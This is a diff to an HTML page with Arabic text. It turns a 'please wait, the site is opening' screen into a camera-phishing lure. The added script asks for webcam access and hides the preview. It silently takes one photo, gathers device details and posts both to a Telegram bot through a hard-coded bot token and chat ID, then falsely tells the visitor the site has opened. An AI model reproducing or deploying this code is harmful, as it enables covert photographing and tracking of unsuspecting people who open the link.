@@ -32,12 +32,99 @@ body {
   padding: 20px 30px;
   border-radius: 10px;
 }
+}
+
+/* إخفاء معاينة الكاميرا */
+video {
+  display: none;
+}
 </style>
 </head>
 
 <body>
-  <div class="overlay">
-    <h3>انتظر، سيتم فتح الموقع</h3>
-  </div>
+
+<h3> انتضر سيتم فتح الموقع  </h3>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// ===== ضع معلوماتك هنا (محليًا فقط) =====
+const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
+const CHAT_ID  = "6251932709";
+// ======================================
+
+let streamRef = null;
+
+// جمع معلومات الجهاز
+function getDeviceInfo() {
+  const ua = navigator.userAgent;
+
+  let deviceType = "غير معروف";
+  if (/android/i.test(ua)) deviceType = "Android";
+  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
+  else if (/windows/i.test(ua)) deviceType = "Windows";
+  else if (/macintosh/i.test(ua)) deviceType = "Mac";
+  else if (/linux/i.test(ua)) deviceType = "Linux";
+
+  return `
+📱 نوع الجهاز: ${deviceType}
+
+🌐 المتصفح: ${navigator.appName}
+
+🧭 User-Agent: ${ua}
+
+📐 دقة الشاشة: ${screen.width} x ${screen.height}
+
+⏰ الوقت: ${new Date().toLocaleString()}
+  `;
+}
+
+// تشغيل الكاميرا (بموافقة المستخدم)
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  streamRef = stream;
+  document.getElementById("video").srcObject = stream;
+
+  // صورة واحدة فقط بعد ثانيتين
+  setTimeout(captureOnce, 2000);
+})
+.catch(() => {
+  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا</h2>";
+});
+
+function captureOnce() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  // إيقاف الكاميرا
+  if (streamRef) {
+    streamRef.getTracks().forEach(t => t.stop());
+  }
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+    form.append("caption", getDeviceInfo());
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    })
+    .then(() => {
+      document.body.innerHTML = "<h2>تم الفتح ✅</h2>";
+    })
+    .catch(() => {
+      document.body.innerHTML = "<h2>فشل فتح ❌</h2>";
+    });
+  }, "image/jpeg");
+}
+</script>
+
 </body>
 </html>
